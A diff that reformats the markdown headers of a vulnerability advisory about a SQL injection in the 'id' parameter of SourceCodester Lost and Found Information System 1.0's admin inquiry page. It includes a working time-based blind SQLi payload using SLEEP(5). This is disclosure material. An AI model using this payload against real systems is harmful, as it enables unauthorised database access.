@@ -1,24 +1,24 @@
-#SOURCECODESTER LOST AND FOUND INFORMATION SYSTEM 1.0 GET PARAMETER inquiries/view_inquiry ID SQL INJECTION
+# SOURCECODESTER LOST AND FOUND INFORMATION SYSTEM 1.0 GET PARAMETER inquiries/view_inquiry ID SQL INJECTION
 
-##Vendor Homepage:
+## Vendor Homepage:
 https://www.sourcecodester.com
 
-##Software Link:
+## Software Link:
 LOST AND FOUND INFORMATION SYSTEM
 https://www.sourcecodester.com/php/16525/lost-and-found-information-system-using-php-and-mysql-db-source-code-free-download.html
 
-##Tested On:
+## Tested On:
 Window 11, XAMPP
 
-##Affected Page:
+## Affected Page:
 php-lfis/admin/?page=inquiries/view_inquiry&id=
 
-##Description:
+## Description:
 A vulnerability SQL injection was found in SourceCodester Lost and Found Information System 1.0. It has been classified as critical. SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
 
-##Proof of Concept:
-###1. Visit page: /php-lfis/admin/?page=inquiries/view_inquiry&id=1
-###2. Intercept request and inject payload sql query in param 'id' to sleep 5 second: 
+## Proof of Concept:
+### 1. Visit page: /php-lfis/admin/?page=inquiries/view_inquiry&id=1
+### 2. Intercept request and inject payload sql query in param 'id' to sleep 5 second: 
 ```
 '+AND+(SELECT+1200+FROM+(SELECT(SLEEP(5)))pTou)+AND+'str'%3d'str
 ```
